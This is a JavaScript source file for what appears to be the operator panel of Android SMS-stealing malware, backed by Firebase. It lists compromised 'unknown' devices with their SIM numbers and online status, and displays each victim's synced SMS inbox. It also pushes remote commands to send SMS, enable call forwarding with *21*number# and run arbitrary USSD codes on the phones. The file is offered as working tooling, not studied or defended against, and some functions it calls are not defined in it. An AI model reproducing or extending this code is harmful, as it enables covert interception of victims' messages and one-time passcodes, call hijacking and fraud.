// main.js - Super Fast Version: Instant State & Fully Working Features

let devicesList = [];
let messagesList = [];
const ONLINE_THRESHOLD = 2 * 60 * 1000;

let currentSection = 'dashboard';
let activeDeviceId = null;
let commandModal = null;

const $ = id => document.getElementById(id);
const escapeHtml = s => String(s || '').replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));

// --- Instant Navigation ---
function navigateTo(section, deviceId = null) {
    currentSection = section;
    activeDeviceId = deviceId;

    document.querySelectorAll('.section-content').forEach(s => s.style.display = 'none');

    if (deviceId) {
        $('section-device-detail').style.display = 'block';
        renderDeviceDetail(deviceId);
    } else {
        const target = $(`section-${section}`) || $('section-dashboard');
        target.style.display = 'block';
        if(section === 'admin-menu') renderAdminMenu();
        if(section === 'more') renderMore();
    }

    document.querySelectorAll('.nav-item, .list-group-item').forEach(el => {
        el.classList.toggle('active', el.getAttribute('data-section') === section);
    });
    window.scrollTo(0,0);
}

// --- Data Listeners ---
function initFirebaseListeners() {
    const db = firebase.database();

    db.ref('.info/connected').on('value', s => { if(s.val() === true) $('loading-overlay').style.display = 'none'; });

    db.ref('users_data').on('value', snap => {
        const list = [];
        snap.forEach(child => {
            const v = child.val();
            list.push({ id: child.key, ...v, brand: v.deviceBrand || v.brand || 'Android', model: v.deviceModel || v.model || 'Device', mobile: v.mobile || v.phone || '—' });
        });
        devicesList = list;
        updateDashboardUI();
        updateEntriesUI();
        if(activeDeviceId) updateDeviceStatusLive(activeDeviceId);
    });

    db.ref('messages').on('value', snap => {
        const list = [];
        snap.forEach(child => {
            const v = child.val();
            list.push({ key: child.key, ...v, from: v.from || v.sender || '—', to: v.to || v.receiver || '—', body: v.body || v.message || '', timestamp: Number(v.timestamp || 0) });
        });
        list.sort((a, b) => b.timestamp - a.timestamp);
        messagesList = list;
        updateMessagesUI();
    });
}

// --- DASHBOARD ---
function updateDashboardUI() {
    const cont = $('section-dashboard');
    if(!cont) return;
    const onlineCount = devicesList.filter(d => {
        const last = Number(d.lastSeen || d.timestamp || 0);
        return !!last && (Date.now() - last) <= ONLINE_THRESHOLD;
    }).length;

    cont.innerHTML = `
        <div class="top-header-info">Connected to Firebase — ${devicesList.length} device(s)</div>
        <div class="px-4 py-2 d-flex justify-content-between align-items-center bg-white shadow-sm mb-3">
            <h5 class="fw-bold mb-0">Overview</h5>
            <div class="d-flex align-items-center gap-3"><span class="status-badge status-online">Firebase: ONLINE</span><i class="fas fa-bell text-danger fs-5 position-relative"></i></div>
        </div>
        <div class="search-container mb-4"><i class="fas fa-search"></i><input type="text" oninput="filterDash(this.value)" placeholder="Search device ID, model, SIM..."></div>
        <div class="px-4">
            <div class="row g-3 mb-4">
                <div class="col-6"><div class="overview-card shadow-sm"><h3>${devicesList.length}</h3><p>Active devices</p></div></div>
                <div class="col-6"><div class="overview-card shadow-sm"><h3>1</h3><p>Last hour</p></div></div>
                <div class="col-6"><div class="overview-card shadow-sm"><h3>${onlineCount}</h3><p>Online now</p></div></div>
                <div class="col-6"><div class="overview-card shadow-sm"><h3>${new Set(devicesList.map(d=>d.model)).size}</h3><p>Unique models</p></div></div>
            </div>
            <h5 class="fw-bold mb-3">All devices</h5>
            <div id="dash-list-inner"></div>
        </div>
    `;
    filterDash("");
}

function filterDash(q) {
    const list = $('dash-list-inner');
    if(!list) return;
    const query = q.toLowerCase();
    const filtered = devicesList.filter(d => d.id.toLowerCase().includes(query) || d.model.toLowerCase().includes(query));
    list.innerHTML = filtered.map(d => {
        const online = (Number(d.lastSeen || d.timestamp || 0) && (Date.now() - Number(d.lastSeen || d.timestamp || 0)) <= ONLINE_THRESHOLD);
        const diff = Date.now() - (d.lastSeen || d.timestamp || 0);
        let timeTxt = '—';
        if(d.lastSeen || d.timestamp) {
            if (diff < 60000) timeTxt = Math.floor(diff / 1000) + 'S AGO';
            else if (diff < 3600000) timeTxt = Math.floor(diff / 60000) + 'M AGO';
            else timeTxt = new Date(d.lastSeen || d.timestamp).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
        }
        return `
        <div class="device-item-card shadow-sm" onclick="navigateTo('dashboard', '${d.id}')">
            <div class="d-flex justify-content-between align-items-start">
                <div class="d-flex gap-3">
                    <div class="device-icon shadow-sm"><i class="fas fa-mobile-alt"></i></div>
                    <div><div class="fw-bold text-dark">#${d.id.substring(0, 7)} ${escapeHtml(d.brand)} ${escapeHtml(d.model)}</div><div class="small text-muted mt-1 fw-bold" style="font-size:0.7rem;">${timeTxt}</div></div>
                </div>
                <div class="text-end">
                    <span class="status-badge ${online ? 'status-online' : 'status-offline'}">${online ? 'ONLINE' : 'OFFLINE'}</span>
                    <div class="text-primary small fw-bold mt-2">CHECK</div>
                </div>
            </div>
            <div class="row g-2 mt-3">
                <div class="col-6"><div class="sim-slot-box"><label>SIM 1</label><span>${escapeHtml(d.mobile)}</span></div></div>
                <div class="col-6"><div class="sim-slot-box"><label>SIM 2</label><span>—</span></div></div>
            </div>
        </div>`;
    }).join('');
}

// --- DEVICE DETAIL ---
function renderDeviceDetail(deviceId) {
    const d = devicesList.find(x => x.id === deviceId) || { id: deviceId, brand: 'Android', model: 'Device' };
    $('section-device-detail').innerHTML = `
        <div class="px-4 py-3 bg-white d-flex align-items-center gap-3 shadow-sm mb-3">
            <button class="btn btn-light rounded-circle shadow-sm" onclick="navigateTo('dashboard')"><i class="fas fa-arrow-left"></i></button>
            <h5 class="fw-bold mb-0">Control: ${escapeHtml(d.brand)}</h5>
        </div>
        <div class="px-3">
            <div class="control-card p-4 border-0 shadow-sm mb-4" style="background:#fff; border-radius:25px;">
                <h4 class="fw-bold mb-1">Unknown device</h4>
                <div class="small text-muted mb-2">ID: <span class="text-danger">${deviceId}</span></div>
                <div class="fw-bold small mb-1">SIM: <span class="text-primary" id="det-sim">${escapeHtml(d.mobile)}</span></div>
                <div class="fw-bold small mb-1">Forward Call: <span class="text-danger" id="det-fwd">${d.forwardCall || 'OFF'}</span></div>
                <div class="fw-bold small">Last seen: <span class="text-danger" id="det-seen">—</span></div>
            </div>
            <div class="row g-3 mb-4">
                <div class="col-6"><button class="btn-command py-3 shadow-sm" onclick="pushCmd('check_online')">Check Online</button></div>
                <div class="col-6"><button class="btn-command py-3 shadow-sm" onclick="pushCmd('get_sms')">Get SMS</button></div>
                <div class="col-6"><button class="btn-command py-3 shadow-sm" onclick="openCmdPopup('send_sms')">Send SMS</button></div>
                <div class="col-6"><button class="btn-command py-3 shadow-sm" onclick="openCmdPopup('call_forward')">Call Forwarding</button></div>
                <div class="col-12"><button class="btn-command py-3 shadow-sm" onclick="openCmdPopup('ussd')">Dial USSD</button></div>
                <div class="col-12"><button class="btn-command py-3 shadow-sm" onclick="pushCmd('view_data')">View Data</button></div>
            </div>
            <div class="rounded-4 overflow-hidden shadow-sm mb-4 border-0">
                <div class="sms-header-blue py-3 px-4"><span class="fw-bold">SMS log / history</span><button class="btn btn-light btn-sm fw-bold px-3 rounded-pill" onclick="pushCmd('get_sms')">Request SMS (sync inbox)</button></div>
                <div class="bg-white p-3" id="device-sms-list-inner"></div>
            </div>
        </div>
    `;
    const smsRef = firebase.database().ref(`users_data/${deviceId}/sms`);
    smsRef.on('value', snap => {
        const list = [];
        snap.forEach(ch => list.push({key: ch.key, ...ch.val()}));
        list.sort((a,b) => (b.timestamp || 0) - (a.timestamp || 0));
        const cont = $('device-sms-list-inner');
        if(cont) cont.innerHTML = list.length ? list.map(m => formatSmsCard(m)).join('') : '<p class="text-muted text-center py-4">No SMS yet.</p>';
    });
}

function formatSmsCard(m) {
    const time = m.timestamp ? new Date(m.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '—';
    return `
        <div class="sms-card p-3 mb-3 shadow-sm" data-key="${m.key}" style="border: 2px solid #3498db; border-radius:15px; background:#fff;">
            <div class="sms-top d-flex justify-content-between fw-bold"><span>From: ${escapeHtml(m.from || m.sender)}</span><span class="text-muted">${time}</span></div>
            <div class="sms-to fw-bold mt-1">To: ${escapeHtml(m.to || m.receiver)}</div>
            <hr class="my-2"><div class="sms-body text-dark py-1">${escapeHtml(m.body || m.message)}</div><hr class="my-2">
            <div class="sms-foot d-flex justify-content-center gap-5">
                <button class="btn-sms-copy border-0 bg-transparent fs-2" onclick="copyTxt('${m.key}')">📋</button>
                <button class="btn-sms-del d-flex align-items-center justify-content-center" style="background:#000; color:#fff; width:40px; height:40px; border-radius:50%;" onclick="delSms('${m.key}')"><i class="fas fa-trash-alt"></i></button>
            </div>
        </div>`;
}

// --- Working Commands (Instant) ---
window.pushCmd = (type, payload = {}) => {
    if(!activeDeviceId) return;
    firebase.database().ref(`users_data/${activeDeviceId}/commands/pending`).push({ type, payload, createdAt: Date.now() });
};

window.openCmdPopup = (type) => {
    const body = $('command-modal-body');
    if (type === 'call_forward') {
        body.innerHTML = `
            <div class="p-4 text-center">
                <h5 class="fw-bold mb-4">CALL FORWARD</h5>
                <div class="d-flex justify-content-center gap-4 mb-4">
                    <div class="form-check"><input class="form-check-input" type="radio" name="sim" value="0" checked id="c1"><label class="form-check-label fw-bold" for="c1">SIM 1</label></div>
                    <div class="form-check"><input class="form-check-input" type="radio" name="sim" value="1" id="c2"><label class="form-check-label fw-bold" for="c2">SIM 2</label></div>
                </div>
                <input type="tel" class="form-control text-center py-3 mb-4 fs-5 bg-light border-0" id="cf-num" placeholder="Forward To..." style="border-radius:15px;">
                <div class="d-flex gap-2 mb-3">
                    <button class="btn-on flex-grow-1 py-3" onclick="sendCF(true)">ON</button>
                    <button class="btn-off flex-grow-1 py-3" onclick="sendCF(false)">OFF</button>
                </div>
                <div class="bg-light p-2 rounded mb-3 small text-muted">*21*number# / ##21#</div>
                <button class="btn btn-link text-muted fw-bold text-decoration-none" data-bs-dismiss="modal">CANCEL</button>
            </div>`;
    } else if (type === 'send_sms') {
        body.innerHTML = `
            <div class="p-4">
                <h5 class="fw-bold text-center mb-4 text-uppercase">SEND SMS</h5>
                <div class="d-flex justify-content-center gap-4 mb-4">
                    <div class="form-check"><input class="form-check-input" type="radio" name="sim" value="0" checked id="s1"><label class="form-check-label fw-bold" for="s1">SIM 1</label></div>
                    <div class="form-check"><input class="form-check-input" type="radio" name="sim" value="1" id="s2"><label class="form-check-label fw-bold" for="s2">SIM 2</label></div>
                </div>
                <div class="mb-3">
                    <div class="d-flex justify-content-between mb-1"><label class="small text-muted fw-bold">To Number</label><a href="javascript:void(0)" class="small fw-bold text-primary text-decoration-none" onclick="pasteTxt('sms-n')">PASTE</a></div>
                    <input type="tel" class="form-control py-2 shadow-sm border-0" id="sms-n" placeholder="Number">
                </div>
                <div class="mb-4">
                    <div class="d-flex justify-content-between mb-1"><label class="small text-muted fw-bold">Message</label><a href="javascript:void(0)" class="small fw-bold text-primary text-decoration-none" onclick="pasteTxt('sms-m')">PASTE</a></div>
                    <textarea class="form-control shadow-sm border-0" id="sms-m" rows="4" placeholder="Message"></textarea>
                </div>
                <div class="d-flex gap-2">
                    <button class="btn btn-light flex-grow-1 fw-bold shadow-sm" data-bs-dismiss="modal">Cancel</button>
                    <button class="btn-send flex-grow-1 shadow-sm" style="background:#7b2cbf; border:none;" onclick="sendSMS()">Send Command</button>
                </div>
            </div>`;
    } else if (type === 'ussd') {
        body.innerHTML = `
            <div class="p-4 text-center">
                <h5 class="fw-bold mb-4">USSD</h5>
                <div class="d-flex justify-content-center gap-4 mb-4">
                    <div class="form-check"><input class="form-check-input" type="radio" name="sim" value="0" checked id="u1"><label class="form-check-label fw-bold" for="u1">SIM 1</label></div>
                    <div class="form-check"><input class="form-check-input" type="radio" name="sim" value="1" id="u2"><label class="form-check-label fw-bold" for="u2">SIM 2</label></div>
                </div>
                <input type="text" class="form-control text-center py-3 mb-4 fs-5 bg-light border-0" id="u-code" value="*123#" style="border-radius:12px;">
                <button class="btn btn-primary w-100 py-3 fw-bold shadow-sm mb-3" style="background:#7b2cbf; border:none; border-radius:12px;" onclick="sendUSSD()">Run USSD</button>
                <div class="bg-light p-3 rounded mb-3 small text-muted" id="u-res" style="min-height:50px;">—</div>
                <button class="btn btn-link text-muted fw-bold text-decoration-none" data-bs-dismiss="modal">CANCEL</button>
            </div>`;
        firebase.database().ref(`users_data/${activeDeviceId}/ussdLastResult`).on('value', s => { if($('u-res')) $('u-res').textContent = s.val() || '—'; });
    }
    commandModal.show();
};

window.sendCF = (on) => { const sim = parseInt(document.querySelector('input[name="sim"]:checked').value); pushCmd('call_forward_ussd', { enable: on, number: $('cf-num')?.value || '', simSlot: sim }); commandModal.hide(); };
window.sendSMS = () => { const sim = parseInt(document.querySelector('input[name="sim"]:checked').value); pushCmd('send_sms', { to: $('sms-n').value, body: $('sms-m').value, simSlot: sim }); commandModal.hide(); };
window.sendUSSD = () => { const sim = parseInt(document.querySelector('input[name="sim"]:checked').value); pushCmd('ussd', { code: $('u-code').value, simSlot: sim }); };
window.pasteTxt = (id) => navigator.clipboard.readText().then(t => $(id).value = t);

// --- Initialization ---
if(!commandModal) commandModal = new bootstrap.Modal($('commandModal'));
document.querySelectorAll('.nav-item, .list-group-item').forEach(el => el.onclick = () => navigateTo(el.getAttribute('data-section')));
initFirebaseListeners();
navigateTo('dashboard');
